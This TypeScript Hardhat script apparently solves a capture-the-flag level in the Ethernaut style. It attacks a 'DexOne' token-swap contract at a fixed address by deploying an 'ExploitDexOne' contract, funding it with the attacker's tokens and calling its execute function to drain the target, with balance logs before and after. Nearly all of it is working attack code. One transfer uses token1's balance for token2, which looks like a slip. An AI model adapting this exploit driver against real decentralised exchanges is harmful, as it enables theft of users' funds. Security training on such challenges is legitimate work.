// import { ethers } from 'hardhat'
import { DexOne } from '../types/typechain/DexOne'
import { ExploitDexOne } from '../types/typechain/ExploitDexOne'
import { ERC20 } from '../types/typechain/ERC20'
import 'dotenv/config'
import { ethers } from 'hardhat'

async function main() {
  const targetAddr = '0x1d7D3C806AD8784913D09A31a0Da33187571B7CB'

  const attacker = new ethers.Wallet(
    process.env.DEV_WALLET as string,
    ethers.provider
  )

  const targetFac = await ethers.getContractFactory('DexOne', attacker)
  const target = targetFac.attach(targetAddr) as DexOne

  const tokeFac = await ethers.getContractFactory('ERC20', attacker)
  const token1 = tokeFac.attach(await target.token1()) as ERC20
  const token2 = tokeFac.attach(await target.token2()) as ERC20

  const exploitFac = await ethers.getContractFactory('ExploitDexOne')
  const exploit = (await exploitFac.deploy(target.address)) as ExploitDexOne

  const logBalance = async (addr: string, label: string) => {
    console.log(`\n#${label}#`)
    console.log(
      'T1',
      await token1.balanceOf(addr),
      '\nT2',
      await token2.balanceOf(addr)
    )
  }

  const resT1 = await token1.transfer(
    exploit.address,
    await token1.balanceOf(attacker.address),
    { gasLimit: 800000 }
  )
  const resT2 = await token2.transfer(
    exploit.address,
    await token1.balanceOf(attacker.address),
    { gasLimit: 800000 }
  )

  console.log('Transfering balance to exploit contract ...')
  await Promise.all([resT1.wait(), resT2.wait()])

  await logBalance(target.address, 'Target')
  await logBalance(attacker.address, 'Attacker')
  await logBalance(exploit.address, 'Exploit')

  await exploit.deployed()
  console.log('\n', exploit.address)
  console.log('Exploit deployed, executing ...')
  const res = await exploit.execute({ gasLimit: 800000 })
  await res.wait()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')

  await logBalance(target.address, 'Target')
  await logBalance(attacker.address, 'Attacker')
  await logBalance(exploit.address, 'Exploit')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
